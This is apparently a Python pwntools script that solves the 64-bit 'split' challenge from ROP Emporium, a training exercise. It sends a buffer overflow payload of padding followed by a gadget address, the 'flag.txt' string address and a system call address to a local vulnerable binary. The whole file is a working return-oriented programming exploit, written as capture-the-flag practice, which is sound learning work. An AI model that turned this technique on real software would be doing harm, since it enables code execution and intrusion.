#!/usr/bin/python

# ROP for 64 bit split challenge on ropemporium.com

from pwn import *
context.log_level = 'debug'


#e = ELF('./split')

#for address in e.search('flag.txt'):
#    print "memory location of string 'cat flag.txt':"
#    print hex(address)


#REMOTE:
#r=remote('127.0.0.1',80)

#LOCAL:
r=process('./split')

r.recvuntil('>')

#system from useful Function 0x0000000000400810
#system from libc 0x7ffff7a52390

exploit = ""
exploit += "A" * 36
exploit += "B" * 4
exploit += p64(0x0000000000400883)
exploit += p64(0x601065)
exploit += p64(0x0000000000400810)

print exploit

r.sendline(exploit)

r.recvline()
#r.interactive()
#r.send("This also sends a string")
